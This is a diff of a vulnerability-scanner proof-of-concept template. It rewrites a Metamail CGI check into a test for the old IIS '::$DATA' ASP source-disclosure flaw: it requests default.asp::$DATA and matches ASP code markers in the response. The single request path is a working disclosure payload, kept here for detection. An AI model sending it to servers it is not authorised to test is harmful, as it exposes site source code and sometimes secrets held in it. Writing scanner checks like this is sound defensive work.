@@ -1,35 +1,35 @@
 [info]
 author = "ave"
-description = "Metamail 2.8 remote command execution via malformed MIME attachment interpreted as filename"
+description = "AVE-1999-0240 verification for IIS ::$DATA ASP source disclosure"
 id = "POC-AVE-1999-0240"
-name = "CVE-1999-0683 PoC"
+name = "PoC for AVE-1999-0240"
 severity = "medium"
-tags = ["cve-1999-0683"]
-vuln_id = [
-    "CVE-1999-0683",
-    "AVE-1999-0240",
-]
+tags = ["ave-1999-0240"]
+vuln_id = ["AVE-1999-0240"]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cgi-bin/metamail.cgi"
+path = "/{{BaseURL}}/default.asp::$DATA"
 protocol = "http"
 
 [poc.requests.body]
 content = ""
 type = "raw"
 
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "metamail",
-    "Metamail",
+    "<%",
+    "Server.CreateObject",
+    "Response.Write",
 ]
